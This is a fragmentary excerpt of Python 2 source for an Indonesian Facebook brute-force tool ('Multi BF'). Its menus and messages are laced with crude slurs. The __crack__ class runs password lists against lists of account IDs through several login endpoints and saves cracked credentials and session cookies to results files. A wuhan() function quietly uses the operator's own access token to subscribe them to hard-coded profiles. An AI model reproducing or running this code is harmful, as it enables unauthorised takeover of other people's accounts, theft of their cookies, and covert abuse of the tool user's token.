...
logo = ' \x1b[0;96m  __  ___     ____  _   ___  ____\n\x1b[0;96m  /  |/  /_ __/ / /_(_) / _ )/ __/\x1b[0;97m|| Created By \x1b[0;93mMoch Aang\n\x1b[0;96m / /|_/ / // / / __/ / / _  / _/  \x1b[0;97m|| Youtube \x1b[0;93mAang-XD\n\x1b[0;96m/_/  /_/\\_,_/_/\\__/_/ /____/_/\x1b[0;93mv3.2\x1b[0;97m|| Facebook \x1b[0;93mMoch.AangXD404'
...
def yayanxd():
    ...
    kontol = raw_input('%s%s\xe2\x95\x9a[?]%s Malak Token :%s ' % (N, O, N, H))
    ...
    try:
        ...
        time.sleep(2)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Script Ini Baru Di Update Pada 31/01/22 \x1b[0;96m]' % (O, N)
        time.sleep(2)
        ...
        print '\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] Token Invalid Ngab!' % (O, M, N)
        time.sleep(2)
        yayanxd()
...
def moch_yayan():
    ...
    print '%s%s' % (O, N)
    ...
    time.sleep(0.03)
    print '%s%s' % (O, N)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Author : \x1b[0;93mMoch Aang Ardiansyah-XD' % (O, N)
    time.sleep(0.03)
    ...
    time.sleep(0.03)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[6]%s Cek ingpomasih \x1b[0;93makun facebook' % (O, N)
    time.sleep(0.03)
    ...
    time.sleep(0.03)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[9]%s Ingpomasih %sScript Multi BF%s' % (O, N, O, N)
    time.sleep(0.03)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[0]%s Keluar [%sAhh Ngecrot%s]' % (O, N, K, N)
    time.sleep(0.03)
    print '%s\xe2\x95\x91%s' % (O, N)
    time.sleep(0.03)
    pepek = raw_input('\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[\xe2\x80\xa2] \x1b[0;97mMenu : ')
    if pepek == '':
        print '%s%s\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s JANGAN KOSONG KENTOD ]' % (O, N, O)
        time.sleep(2)
        moch_yayan()
        ...
        try:
            ...
            for file in dirs:
                print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s %s' % (N, N, file)
            ...
            print '%s%s\xe2\x95\xa0%s' % (N, N, N)
            time.sleep(2)
            nm_file = ('%s' % file).replace('-', ' ')
            hps_nm = nm_file.replace('.txt', '').replace('OK', '').replace('CP', '')
            jalan('%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s ' % (N, N, O, N, N, O, hps_nm, N, N, O, len(total), O))
            print '%s%s\xe2\x95\xa0%s' % (N, N, N)
            time.sleep(2)
            for memek in total:
            ...
            print '%s%s\xe2\x95\xa0%s' % (N, N, N)
            time.sleep(2)
            raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s KEMBALI ] ' % (N, N))
            moch_yayan()
        except IOError:
            print '\n%s[%s!%s] Awokawok kaga dapet hasil' % (N, K, N)
            raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s KEMBALI%s ] ' % (N, N))
            moch_yayan()
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100023195040539/subscribers?access_token=%s' % kentod)
        ...
        requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=%s' % kentod)
...
def seting_yntkts():
    ...
    print '[%s2%s] Cek user agent' % (O, N)
    ytbjts = raw_input('\n%s[%s?%s] Menu : ' % (N, O, N))
    if ytbjts == '':
        print '\n%s[%s\xc3\x97%s] Ndak boleh kosong Kentod' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts == '1':
...
def check_yntkts():
    try:
        ...
        user_agent = '%sMozilla/5.0 (Linux; Android 10; Redmi 7A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]' % H
    except:
        pass
...
class __crack__():
    ...
    def plerr(self):
        try:
            ...
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s!%s] File [%s%s%s] Ndak ada kentod' % (O, K, N, K, self.apk, N)
            time.sleep(2)
            print '%s\xe2\x95\x91%s ' % (O, N)
            raw_input('%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[ %sKEMBALI%s ]' % (O, N, O))
            moch_yayan()
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    print '%s\xe2\x95\x91%s ' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s Metode \x1b[0;93mB-Api \x1b[0;97mv1' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s Metode \x1b[0;93mB-Api \x1b[0;97mv2' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s Metode \x1b[0;93mMbasic' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[4]%s Metode \x1b[0;93mMobile fb' % (O, N)
                    print '%s\xe2\x95\x91%s ' % (O, N)
                    __yan__(pwek.split(','))
                    break
    ...
    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r\x1b[0;96m[\x1b[0;97m%s\x1b[0;96m] [\x1b[0;97m%s/%s\x1b[0;96m] [\x1b[0;92mOK/%s\x1b[0;96m] [\x1b[0;93mCP/%s\x1b[0;96m]' % (datetime.now().strftime('%H:%M:%S'), loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r%s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, N)
                wrt = '\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki)
                ok.append(wrt)
                ...
                try:
                    ...
                    wrt = '\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[Cp] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                ...
                print '\r%s[CP] %s \xe2\x80\xa2 %s                %s' % (O, user, pw, N)
                wrt = '\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[Cp] %s \xe2\x80\xa2 %s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s!%s] Pilih Yang Bener Kontol !' % (N, O, N)
            self.__pler__()
